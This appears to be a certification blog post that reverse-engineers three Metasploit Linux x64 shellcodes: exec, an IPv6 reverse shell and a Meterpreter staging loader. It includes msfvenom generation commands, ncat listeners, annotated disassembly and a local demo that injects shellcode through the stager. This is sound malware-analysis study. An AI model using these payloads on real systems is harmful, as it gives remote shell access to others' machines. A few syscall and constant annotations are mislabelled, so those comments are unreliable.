Assignment #5 – Metasploit Shellcode Analysis
=============================================

In this assignment I will reverse three different Linux x86-64 shellcodes produced by Metasploit. I picked three shellcodes at random discounting the stageless Meterpreter ones (which are huge).

    $ msfvenom -l payloads | grep linux/x64 | grep -v stageless | shuf -n 3
    linux/x64/meterpreter/reverse_tcp    Inject the mettle server payload (staged). Connect back to the attacker
    linux/x64/shell_reverse_ipv6_tcp     Connect back to attacker and spawn a command shell over IPv6
    linux/x64/exec                       Execute an arbitrary command

For each shellcode I used `msfvenom` to produce both an ELF file and a raw file which will be used during reversing.

    msfvenom -p linux/x64/exec CMD=whoami -f elf > linux-x64-exec
    msfvenom -p linux/x64/exec CMD=whoami -f raw > linux-x64-exec.raw
    msfvenom -p linux/x64/shell_reverse_ipv6_tcp LHOST=::1 -f elf > linux-x64-shell_reverse_ipv6_tcp
    msfvenom -p linux/x64/shell_reverse_ipv6_tcp LHOST=::1 -f raw > linux-x64-shell_reverse_ipv6_tcp.raw
    msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 -f elf > linux-x64-meterpreter-reverse_tcp
    msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 -f raw > linux-x64-meterpreter-reverse_tcp.raw

linux/x64/exec
--------------

Fist I checked that the ELF was working as intended, i.e. that it executed `whoami`.

    $ msfvenom -p linux/x64/exec CMD=whoami -f elf > linux-x64-exec
    $ ./linux-x64-exec
    goncalor

Then, I wanted to know which syscalls were being used. A good tool for this is `strace`, which can be used to execute a program and get information about which syscalls it executes.

    $ strace -b execve ./linux-x64-exec
    execve("./linux-x64-exec", ["./linux-x64-exec"], 0x7ffed6f7f010 /* 40 vars */) = 0
    execve("/bin/sh", ["/bin/sh", "-c", "whoami"], NULLstrace: Process 3457 detached
     <detached ...>
     goncalor

So we see that the ELF is calling `execve` and executing the command `/bin/sh -c whoami`. From [`man execve`][man_2_execve] we know this syscall receives the path to a binary/script to execute, an null terminated array of arguments to the binary/script, and a null terminated array with environment variables. And from the output of `strace` we already know what is being put into each of these arguments.

    int execve(const char *pathname, char *const argv[], char *const envp[]);

Now let's see how things are being done behind the scenes. Let's disassemble the ELF:

    $ objdump -M intel -d linux-x64-exec

    linux-x64-exec:     file format elf64-x86-64

Hm... What? No output? Well, it seems that the ELF file produced by `msfvenom` has no headers and `objdump` relies on headers to disassemble, so it's not the best tool to use here (but it could be used with `objdump -M intel,x86-64 -b binary -m i386 -D --start-address=120 linux-x64-exec`, where the 120 was obtained by doing some math with the output of `readelf -a`. Instead, let's use `ndisasm`.

    $ ndisasm -b64 linux-x64-exec.raw
    00000000  6A3B              push byte +0x3b
    00000002  58                pop rax
    00000003  99                cdq
    00000004  48BB2F62696E2F73  mov rbx,0x68732f6e69622f
              -6800
    0000000E  53                push rbx
    0000000F  4889E7            mov rdi,rsp
    00000012  682D630000        push qword 0x632d
    00000017  4889E6            mov rsi,rsp
    0000001A  52                push rdx
    0000001B  E807000000        call 0x27
    00000020  7768              ja 0x8a
    00000022  6F                outsd
    00000023  61                db 0x61
    00000024  6D                insd
    00000025  690056574889      imul eax,[rax],dword 0x89485756
    0000002B  E60F              out 0xf,al
    0000002D  05                db 0x05

The first striking thing is that there's no `syscall` instruction anywhere. After `call` there are some weird instructions which lead me to suspect that's actually data stored in the `.text` section. That data may be misaligning the next instructions and `syscall` is probably there. Since we have `call 0x27` let's try to disassemble starting at that position of the shellcode.

    $ ndisasm -b64 linux-x64-exec.raw -e 0x27 -o 0x27
    00000027  56                push rsi
    00000028  57                push rdi
    00000029  4889E6            mov rsi,rsp
    0000002C  0F05              syscall

Alright! There's the `syscall`!

The first three instructions initialise RAX and RDX.

    00000000  6A3B              push byte +0x3b    ; __NR_execve = 59 = 0x3b
    00000002  58                pop rax            ; rax = 0x3b
    00000003  99                cdq                ; rdx = 0

Then some value is pushed to the stack. Using `python` or `rax2` we can see that it's `/bin/sh` and a null byte.

    $ python
    >>> bytes.fromhex("0068732f6e69622f")
    b'\x00hs/nib/'
    >>> bytes.fromhex("0068732f6e69622f")[::-1]
    b'/bin/sh\x00'
    $ rax2 -s 0x68732f6e69622f | rev
    /bin/sh

So `/bin/sh` is pushed to the stack and RDI is used to store a pointer to that string, which makes sense since it's the first argument to `execve`. Then `-c` is pushed too. Then RDX is pushed, which was zeroed before.

    00000004  48BB2F62696E2F73  mov rbx,0x68732f6e69622f  ; "/bin/sh", 0x00
              -6800
    0000000E  53                push rbx
    0000000F  4889E7            mov rdi,rsp               ; rdi = & "/bin/sh"
    00000012  682D630000        push qword 0x632d         ; "-c", 0x00, 0x00
    00000017  4889E6            mov rsi,rsp               ; rsi = & "-c"
    0000001A  52                push rdx

Now we have a `call` which will push the next instruction's address (`0x20`) to the stack and continue execution at `0x27`. There we push RSI and RDI, the addresses for `-c` and `/bin/sh`. Finally RSI is updated to match RSP, which points to the top of the stack, or in other words the last address we pushed.

    0000001B  E807000000        call 0x27
    00000020  7768              ja 0x8a
    ...
    00000027  56                push rsi
    00000028  57                push rdi
    00000029  4889E6            mov rsi,rsp
    0000002C  0F05              syscall

So, let's see what memory and registers look like when `syscall` gets executed.

    +-----------+
    | 0x0       |    <- rdx (arg3)       (higher memory addresses)
    +-----------+
    | 0x20 (??) |
    +-----------+
    | "-c"      |
    +-----------+
    | "/bin/sh" | <┐ <- rdi (arg1)
    +-----------+  |
    | address   | -┘ <- rsi (arg2)       (lower memory addresses)
    +-----------+

As you can see all that's needed to call `execve("/bin/sh", ["/bin/sh", "-c", "whoami"], NULL)` looks in place. The missing piece is what's at address `0x20` which must be `whoami`. Let's check that. The following weird instructions are in fact a string.

<pre>
00000020  7768              ja 0x8a
00000022  6F                outsd
00000023  61                db 0x61
00000024  6D                insd
00000025  690056574889      imul eax,[rax],dword 0x89485756

$ hd linux-x64-exec.raw
00000000  6a 3b 58 99 48 bb 2f 62  69 6e 2f 73 68 00 53 48  |j;X.H./bin/sh.SH|
00000010  89 e7 68 2d 63 00 00 48  89 e6 52 e8 07 00 00 00  |..h-c..H..R.....|
00000020  <b>77 68 6f 61 6d 69 00</b> 56  57 48 89 e6 0f 05        |<b>whoami.</b>VWH....|
0000002e
</pre>

So we're all set. `execve` is executed and it executes `whoami` as intended.


linux/x64/shell_reverse_ipv6_tcp
--------------------------------

Since this is an IPv6 reverse shell let's test it by opening a port and running the shellcode.

    @attacker$ ncat -vl6p 4444
    Ncat: Version 7.70 ( https://nmap.org/ncat )
    Ncat: Listening on :::4444

    $ msfvenom -p linux/x64/shell_reverse_ipv6_tcp LHOST=::1 -f elf > linux-x64-shell_reverse_ipv6_tcp
    $ ./linux-x64-shell_reverse_ipv6_tcp

    @attacker
    Ncat: Connection from ::1.
    Ncat: Connection from ::1:55452
    whoami
    goncalor

`strace` reveals the following. We immediately see this is very similar to the usual IPv4's reverse shell. The only thing that changes are the arguments to `socket` and `connect`.

    $ strace -b execve ./linux-x64-shell_reverse_ipv6_tcp
    execve("./linux-x64-shell_reverse_ipv6_tcp", ["./linux-x64-shell_reverse_ipv6_t"...], 0x7ffcc441f000 /* 40 vars */) = 0
    socket(AF_INET6, SOCK_STREAM, IPPROTO_IP) = 3
    connect(3, {sa_family=AF_INET6, sin6_port=htons(4444), sin6_flowinfo=htonl(0), inet_pton(AF_INET6, "::1", &sin6_addr), sin6_scope_id=0}, 28) = 0
    dup2(3, 2)                              = 2
    dup2(3, 1)                              = 1
    dup2(3, 0)                              = 0
    execve("/bin/sh", NULL, NULLstrace: Process 7318 detached

This time let's disassemble using [`radare2`][wikipedia_radare2].

    $ r2 -d linux-x64-shell_reverse_ipv6_tcp
    [0x00400078]> pd
                ;-- entry0:
                ;-- rip:
                0x00400078      6a29           push 0x29                   ; ')' ; 41
                0x0040007a      58             pop rax
                0x0040007b      6a0a           push 0xa                    ; 10
                0x0040007d      5f             pop rdi
                0x0040007e      6a01           push 1                      ; 1
                0x00400080      5e             pop rsi
                0x00400081      31d2           xor edx, edx
                0x00400083      0f05           syscall
                0x00400085      50             push rax
                0x00400086      5f             pop rdi
            ,=< 0x00400087      eb28           jmp 0x4000b1
            |   0x00400089      5e             pop rsi
            |   0x0040008a      6a2a           push 0x2a                   ; '*' ; 42
            |   0x0040008c      58             pop rax
            |   0x0040008d      6a1c           push 0x1c                   ; 28
            |   0x0040008f      5a             pop rdx
            |   0x00400090      0f05           syscall
            |   0x00400092      6a03           push 3                      ; 3
            |   0x00400094      5e             pop rsi
           .--> 0x00400095      6a21           push 0x21                   ; '!' ; 33
           :|   0x00400097      58             pop rax
           :|   0x00400098      ffce           dec esi
           :|   0x0040009a      0f05           syscall
           `==< 0x0040009c      e0f7           loopne 0x400095
            |   0x0040009e      6a3b           push 0x3b                   ; orax
            |   0x004000a0      58             pop rax
            |   0x004000a1      99             cdq
            |   0x004000a2      48bb2f62696e.  movabs rbx, 0x68732f6e69622f ; '/bin/sh'
            |   0x004000ac      53             push rbx
            |   0x004000ad      54             push rsp
            |   0x004000ae      5f             pop rdi
            |   0x004000af      0f05           syscall
            `-> 0x004000b1      e8d3ffffff     call 0x400089
                0x004000b6      0a00           or al, byte [rax]
                0x004000b8      115c0000       adc dword [rax + rax], ebx
                0x004000bc      0000           add byte [rax], al
                0x004000be      0000           add byte [rax], al
                0x004000c0      0000           add byte [rax], al
                0x004000c2      0000           add byte [rax], al
                0x004000c4      0000           add byte [rax], al
                0x004000c6      0000           add byte [rax], al
                0x004000c8      0000           add byte [rax], al
                0x004000ca      0000           add byte [rax], al
                0x004000cc      0001           add byte [rcx], al
                0x004000ce      0000           add byte [rax], al
                0x004000d0      0000           add byte [rax], al


First there's `socket`. `strace` already did a good job figuring out which constants are being passed to `socket`.

    socket(int domain, int type, int protocol)

    0x00400078      6a29           push 0x29         ; __NR_socket = 0x29 = 41
    0x0040007a      58             pop rax
    0x0040007b      6a0a           push 0xa          ; AF_INET6
    0x0040007d      5f             pop rdi
    0x0040007e      6a01           push 1            ; SOCK_STREAM
    0x00400080      5e             pop rsi
    0x00400081      31d2           xor edx, edx      ; IPPROTO_IP (default protocol)
    0x00400083      0f05           syscall

If we didn't have that information we could still figure out the variables. From [`man socket`][man_2_socket] we know the first argument starts with `AF_` and the second with `SOCK_` so we could use python to understand which constants are used:

    $ python
    >>> import socket
    >>> [x for x in vars(socket).items() if x[1] == 10 and x[0].startswith("AF")]
    [('AF_INET6', <AddressFamily.AF_INET6: 10>)]
    >>> [x for x in vars(socket).items() if x[1] == 1 and x[0].startswith("SOCK")]
    [('SOCK_STREAM', <SocketKind.SOCK_STREAM: 1>)]

Now the shellcode prepares to call `connect`. The first argument is the file descriptor returned by `socket`. Then there's a `jmp` followed by a `call` and a `pop`. This `call` is basically placing the address `0x004000b6` on the stack which then is popped into RSI, the second argument. So this means the bytes after `call` are in fact the `struct sockaddr` for which a pointer is passed as the second argument to `connect`.

    connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)

        0x00400085      50             push rax         ; fd returned by `socket`
        0x00400086      5f             pop rdi
    ,=< 0x00400087      eb28           jmp 0x4000b1
    |   0x00400089      5e             pop rsi
    |   ...
    `-> 0x004000b1      e8d3ffffff     call 0x400089
        0x004000b6      0a00           or al, byte [rax]           ; AF_INET
        0x004000b8      115c0000       adc dword [rax + rax], ebx  ; port 4444 and half of sin6_flowinfo
        0x004000bc      0000           add byte [rax], al
        0x004000be      0000           add byte [rax], al          ; IPv6 address
        0x004000c0      0000           add byte [rax], al
        0x004000c2      0000           add byte [rax], al
        0x004000c4      0000           add byte [rax], al
        0x004000c6      0000           add byte [rax], al
        0x004000c8      0000           add byte [rax], al
        0x004000ca      0000           add byte [rax], al
        0x004000cc      0001           add byte [rcx], al
        0x004000ce      0000           add byte [rax], al          ; sin6_scope_id
        0x004000d0      0000           add byte [rax], al

From [Beej's Guide to Network Programming][beej_sockaddr_in] we know that the `sockaddr` structure looks like this:

    struct sockaddr_in6 {
        u_int16_t       sin6_family;   // address family, AF_INET6
        u_int16_t       sin6_port;     // port number, Network Byte Order
        u_int32_t       sin6_flowinfo; // IPv6 flow information
        struct in6_addr sin6_addr;     // IPv6 address
        u_int32_t       sin6_scope_id; // Scope ID
    };

So `0x000a` is `AF_INET`; `0x5c11` is the port number, which is 4444 (`socket.ntohs(int("0x5c11", 16))`); `0x00000000` is `flowinfo`; then comes the IPv6 address `0x0000...01` or `::1`; and finally `0x00000000` for `scope_id`. The following instructions end the set up and call `connect`.

    0x00400089      5e             pop rsi           ; struct sockaddr *addr
    0x0040008a      6a2a           push 0x2a         ; __NR_connect = 0x2a = 42
    0x0040008c      58             pop rax
    0x0040008d      6a1c           push 0x1c         ; 28 = sizeof(sockaddr_in6)
    0x0040008f      5a             pop rdx
    0x00400090      0f05           syscall

The instructions below call `dup2` on `stdin`, `stdout` and `stderr` such that the all get get connected to the socket. This is done as a loop, as the file descriptors are sequential from 0 to 2.

        0x00400092      6a03           push 3
        0x00400094      5e             pop rsi
    .-> 0x00400095      6a21           push 0x21                   ; __NR_connect = 0x21 = 3
    :   0x00400097      58             pop rax
    :   0x00400098      ffce           dec esi
    :   0x0040009a      0f05           syscall
    `=< 0x0040009c      e0f7           loopne 0x400095

And finally a stack based `execve` is called. RSI is `0x0` after the previous instructions. It's interesting that the second argument to `execve` is null, since the manual states that by convention `argv[0]` should contain the name of the binary. As it seems it's not mandatory (well... it's a "_should_" after all).

    execve(const char *pathname, char *const argv[], char *const envp[])

    0x0040009e      6a3b           push 0x3b                      ; __NR_execve = 0x3b = 59
    0x004000a0      58             pop rax
    0x004000a1      99             cdq                            ; rdx = 0
    0x004000a2      48bb2f62696e.  movabs rbx, 0x68732f6e69622f   ; '/bin/sh'
    0x004000ac      53             push rbx
    0x004000ad      54             push rsp
    0x004000ae      5f             pop rdi
    0x004000af      0f05           syscall


linux/x64/meterpreter/reverse_tcp
---------------------------------

    $ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 -f elf > linux-x64-meterpreter-reverse_tcp
    $ ./linux/x64/meterpreter/reverse_tcp


    $ r2 -d linux-x64-meterpreter-reverse_tcp
     -- Welcome to IDA 10.0.
    [0x00400078]> af
    [0x00400078]> pdf
                ;-- rip:
    / (fcn) entry0 129
    |   entry0 (int32_t arg3);
    |           ; arg int32_t arg3 @ rdx
    |           0x00400078      4831ff         xor rdi, rdi
    |           0x0040007b      6a09           push 9                      ; 9
    |           0x0040007d      58             pop rax
    |           0x0040007e      99             cdq
    |           0x0040007f      b610           mov dh, 0x10                ; 16
    |           0x00400081      4889d6         mov rsi, rdx                ; arg3
    |           0x00400084      4d31c9         xor r9, r9
    |           0x00400087      6a22           push 0x22                   ; '"' ; 34
    |           0x00400089      415a           pop r10
    |           0x0040008b      b207           mov dl, 7
    |           0x0040008d      0f05           syscall
    |           0x0040008f      4885c0         test rax, rax
    |       ,=< 0x00400092      7852           js 0x4000e6
    |       |   0x00400094      6a0a           push 0xa                    ; 10
    |       |   0x00400096      4159           pop r9
    |       |   0x00400098      56             push rsi
    |       |   0x00400099      50             push rax
    |       |   0x0040009a      6a29           push 0x29                   ; ')' ; 41
    |       |   0x0040009c      58             pop rax
    |       |   0x0040009d      99             cdq
    |       |   0x0040009e      6a02           push 2                      ; 2
    |       |   0x004000a0      5f             pop rdi
    |       |   0x004000a1      6a01           push 1                      ; 1
    |       |   0x004000a3      5e             pop rsi
    |       |   0x004000a4      0f05           syscall
    |       |   0x004000a6      4885c0         test rax, rax
    |      ,==< 0x004000a9      783b           js 0x4000e6
    |      ||   0x004000ab      4897           xchg rax, rdi
    |     .---> 0x004000ad      48b90200115c.  movabs rcx, 0x100007f5c110002
    |     :||   0x004000b7      51             push rcx
    |     :||   0x004000b8      4889e6         mov rsi, rsp
    |     :||   0x004000bb      6a10           push 0x10                   ; 16
    |     :||   0x004000bd      5a             pop rdx
    |     :||   0x004000be      6a2a           push 0x2a                   ; '*' ; 42
    |     :||   0x004000c0      58             pop rax
    |     :||   0x004000c1      0f05           syscall
    |     :||   0x004000c3      59             pop rcx
    |     :||   0x004000c4      4885c0         test rax, rax
    |    ,====< 0x004000c7      7925           jns 0x4000ee
    |    |:||   0x004000c9      49ffc9         dec r9
    |   ,=====< 0x004000cc      7418           je 0x4000e6
    |   ||:||   0x004000ce      57             push rdi
    |   ||:||   0x004000cf      6a23           push 0x23                   ; '#' ; 35
    |   ||:||   0x004000d1      58             pop rax
    |   ||:||   0x004000d2      6a00           push 0
    |   ||:||   0x004000d4      6a05           push 5                      ; 5
    |   ||:||   0x004000d6      4889e7         mov rdi, rsp
    |   ||:||   0x004000d9      4831f6         xor rsi, rsi
    |   ||:||   0x004000dc      0f05           syscall
    |   ||:||   0x004000de      59             pop rcx
    |   ||:||   0x004000df      59             pop rcx
    |   ||:||   0x004000e0      5f             pop rdi
    |   ||:||   0x004000e1      4885c0         test rax, rax
    |   ||`===< 0x004000e4      79c7           jns 0x4000ad
    |   `-.``-> 0x004000e6      6a3c           push 0x3c                   ; '<' ; 60
    |    |:     0x004000e8      58             pop rax
    |    |:     0x004000e9      6a01           push 1                      ; 1
    |    |:     0x004000eb      5f             pop rdi
    |    |:     0x004000ec      0f05           syscall
    |    `----> 0x004000ee      5e             pop rsi
    |     :     0x004000ef      5a             pop rdx
    |     :     0x004000f0      0f05           syscall
    |     :     0x004000f2      4885c0         test rax, rax
    |     `===< 0x004000f5      78ef           js 0x4000e6
    \           0x004000f7      ffe6           jmp rsi

RAX is set to 9, which corresponds to [`mmap`][man_2_mmap], which purpose is to "map or unmap files or devices into memory". The first argument is `NULL` so the kernel chooses the address at which to create the mapping. The second argument is the length of the mapping, which here is 4 kB. The third argument is the memory protection for the mapping. By looking at `/usr/include/asm-generic/mman-common.h` we know this mapping has `PROT_READ`, `PROT_WRITE` and `PROT_EXEC`, so basically full permissions which corresponds to `0x7`. I'm not sure why `0x1007` is being used instead. Maybe not clearing RDX is an optimisation because the syscall doesn't look into higher bytes of RDX.

The fourth argument is `0x22` which looking at `/usr/include/asm-generic/mman-common.h` and `/usr/include/linux/mman.h` we find to be `MAP_ANONYMOUS|MAP_PRIVATE`. Since `MAP_ANONYMOUS` is used `fd` is ignored (according to the manual) so you can notice R8 is not initialised. And finally the last argument, the offset, is set to zero. At this point I have no idea what this mapping will be used for. Note that on failure `mmap` returns -1 and the shellcode checks for that and calls `exit` in that event.

    void *mmap(void *addr, size_t len, int prot, int flags, int fildes, off_t off)

        0x00400078      4831ff         xor rdi, rdi                ; rdi = null  (arg1)
        0x0040007b      6a09           push 9                      ; __NR_mmap = 9
        0x0040007d      58             pop rax
        0x0040007e      99             cdq                         ; rdx = 0
        0x0040007f      b610           mov dh, 0x10                ; rdx = 0x1000
        0x00400081      4889d6         mov rsi, rdx                ; rsi = 4096  (arg2)
        0x00400084      4d31c9         xor r9, r9                  ; arg6 = 0
        0x00400087      6a22           push 0x22                   ; MAP_ANONYMOUS|MAP_PRIVATE
        0x00400089      415a           pop r10
        0x0040008b      b207           mov dl, 7                   ; rdx = 0x1007 = 0x1000 | 0x7  (RWX|0x1000)
        0x0040008d      0f05           syscall
        0x0040008f      4885c0         test rax, rax
    ,=< 0x00400092      7852           js 0x4000e6
    |   ...
    `-> 0x004000e6      6a3c           push 0x3c                   ; __NR_exit = 0x3c = 60
        0x004000e8      58             pop rax
        0x004000e9      6a01           push 1
        0x004000eb      5f             pop rdi
        0x004000ec      0f05           syscall

Do you recognise the next instructions? It's a `socket` for IPv4, very similar to the one we saw in the section before. However, among these instructions there are some pushes to the stack with values that are not used for now. `socket`'s return value is saved into RDI.

    0x00400094      6a0a           push 0xa
    0x00400096      4159           pop r9                      ; r9 = 10  (will be used later?)
    0x00400098      56             push rsi                    ; saving 4096 for later
    0x00400099      50             push rax                    ; saving `mmap`'s return address for later
    0x0040009a      6a29           push 0x29                   ; __NR_socket = 0x29 = 41
    0x0040009c      58             pop rax
    0x0040009d      99             cdq
    0x0040009e      6a02           push 2                      ; AF_INET
    0x004000a0      5f             pop rdi
    0x004000a1      6a01           push 1                      ; SOCK_STREAM
    0x004000a3      5e             pop rsi
    0x004000a4      0f05           syscall
    0x004000a6      4885c0         test rax, rax
    0x004000a9      783b           js 0x4000e6                 ; exit
    0x004000ab      4897           xchg rax, rdi

And now we have a `connect` to `127.0.0.1:4444`. The entire `sockaddr_in` structure is moved into RCX and pushed into the stack. Once again refer to [Beej's Guide to Network Programming][beej_sockaddr_in].

    0x004000ad      48b90200115c.  movabs rcx, 0x100007f5c110002   ; sin_zero[8], 127.0.0.1:4444, AF_INET
    0x004000b7      51             push rcx
    0x004000b8      4889e6         mov rsi, rsp
    0x004000bb      6a10           push 0x10                       ; sizeof(sockaddr_in)
    0x004000bd      5a             pop rdx
    0x004000be      6a2a           push 0x2a                       ; __NR_socket = 0x29 = 41
    0x004000c0      58             pop rax
    0x004000c1      0f05           syscall
    0x004000c3      59             pop rcx                         ; pop the sockaddr_in structure

Next the return value of `connect` is tested to check if it succeeded. If it didn't, R9 is decremented (it had been set to 10 before) and if it becomes zero the shellcode exits. Otherwise the code proceeds to call [`nanosleep`][man_2_nanosleep] to suspend the execution for 5 seconds. If `nanosleep` fails the shellcode `exit`s. Otherwise it loops back to `connect`. So basically the shellcode tries to connect 10 times, with a 5 second interval. If no connection succeeds it terminates.

        0x004000c4      4885c0         test rax, rax               ; check if `connect` succeeded
        0x004000c7      7925           jns 0x4000ee
        0x004000c9      49ffc9         dec r9
    ,=< 0x004000cc      7418           je 0x4000e6                 ; exit
    |   0x004000ce      57             push rdi                    ; hold my beer (socket's fd)
    |   0x004000cf      6a23           push 0x23                   ; __NR_nanosleep = 35 = 0x23
    |   0x004000d1      58             pop rax
    |   0x004000d2      6a00           push 0                      ; timespec.tv_nsec = 0
    |   0x004000d4      6a05           push 5                      ; timespec.tv_sec  = 5
    |   0x004000d6      4889e7         mov rdi, rsp                ; rdi = &timespec
    |   0x004000d9      4831f6         xor rsi, rsi                ; rem = NULL
    |   0x004000dc      0f05           syscall
    |   0x004000de      59             pop rcx                     ; remove...
    |   0x004000df      59             pop rcx                     ;   timespec structure
    |   0x004000e0      5f             pop rdi                     ; give by beer back
    |   0x004000e1      4885c0         test rax, rax
    |   0x004000e4      79c7           jns 0x4000ad                ; connect
    `-> 0x004000e6      6a3c           push 0x3c                   ; exit

    struct timespec {
        time_t tv_sec;        /* seconds */
        long   tv_nsec;       /* nanoseconds */
    };

What if a connection succeeds? Then the shellcode jumps to the final part. First two values are popped. Which values are these? They were previously pushed into the stack and were `mmap`'s return address and the size of the mapped region, 4096. Which syscall is called here? The value of RAX is not set here. But if this part of the code is executing it means `connect` succeeded and its return value was zero. Therefore RAX is implicitly set and the syscall is `read`. RDI is also set to the file descriptor of the socket. So the shellcode reads up to 4096 bytes and writes them to the region mapped by `mmap`. If `read` fails the shellcode exits. Otherwise, execution continues at the mapped region.

         0x00400098      56             push rsi                   ; saving 4096 for later
         0x00400099      50             push rax                   ; saving `mmap`'s return address for later
         ...
     ,=< 0x004000c7      7925           jns 0x4000ee
     |   ...
     `-> 0x004000ee      5e             pop rsi                    ; `mmap`'s return address
         0x004000ef      5a             pop rdx                    ; 4096
         0x004000f0      0f05           syscall                    ; read
         0x004000f2      4885c0         test rax, rax
         0x004000f5      78ef           js 0x4000e6                ; exit
         0x004000f7      ffe6           jmp rsi

We conclude that this shellcode basically connects back to an attacker and waits for a second shellcode to be injected directly into the process's memory and executes it. To improve reliability the shellcode tries to connect to the attacker up to 10 times with 5 second intervals.

I never knew that this shellcode directly received shellcode to execute. This was cool to analyse and now I know that this shellcode can be used for more than the typical `multi/handler` with a `meterpreter` payload. Let's prove this by injecting another shellcode, namely `linux/x64/exec` which I analysed before.

    @victim$ ./linux-x64-meterpreter-reverse_tcp

    @attacker$ ncat -vlp 4444 < linux-x64-exec.raw
    Ncat: Listening on 0.0.0.0:4444
    Ncat: Connection from 127.0.0.1:33822.

    @victim
    goncalor

It worked! Our `exec` shellcode, configured to execute `whoami`, was successfully injected and ran on the victim's machine.

That's all for now. I hope you enjoyed my analysis/reversing of these three Metasploit shellcodes.

[man_2_execve]: https://linux.die.net/man/2/execve
[man_2_socket]: https://linux.die.net/man/2/socket
[man_2_mmap]: https://linux.die.net/man/2/mmap
[man_2_nanosleep]: https://linux.die.net/man/2/nanosleep
[wikipedia_radare2]: https://en.wikipedia.org/wiki/Radare2
[beej_sockaddr_in]: https://web.archive.org/web/20190202184104/https://beej.us/guide/bgnet/html/multi/sockaddr_inman.html

----

This blog post has been created for completing the requirements of the [SecurityTube Linux Assembly Expert][SLAE64] certification.

Student ID: SLAE64-1635

[SLAE64]: https://www.pentesteracademy.com/course?id=7
